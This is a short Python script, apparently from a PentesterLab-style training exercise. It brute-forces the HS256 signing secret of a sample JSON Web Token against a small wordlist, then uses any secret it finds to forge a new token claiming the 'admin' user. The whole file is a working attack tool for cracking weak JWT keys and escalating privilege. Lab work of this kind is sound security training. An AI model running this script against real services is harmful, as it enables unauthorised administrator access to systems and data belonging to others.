import jwt 
from jwt import InvalidSignatureError, DecodeError

# Sample JWT token to test (replace this with the actual token)
token = "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjpudWxsfQ.Tr0VvdP6rVBGBGuI_luxGCOaz6BbhC6IxRTlKOW8UjM"

# Wordlist of possible secrets
wordlist = [
    "hacker",
    "jwt",
    "insecurity",
    "pentesterlab",
    "hacking"
]
found_secret = None

# Function to try each secret
for secret in wordlist:
    try:
        # Try to decode the JWT using the current word as secret
        decoded = jwt.decode(token, secret, algorithms=["HS256"])
        print(f"[+] Secret found: {secret}")
        print(f"[+] Decoded payload: {decoded}")
        found_secret=secret
        break
    except InvalidSignatureError:
        print(f"[-] Invalid signature with secret: {secret}")
    except DecodeError:
        print(f"[!] Decode error with secret: {secret}")
if found_secret:
    new_payload={
    "user": "admin"
    }
    new_token=jwt.encode(new_payload, found_secret, algorithm="HS256")
    print(new_token)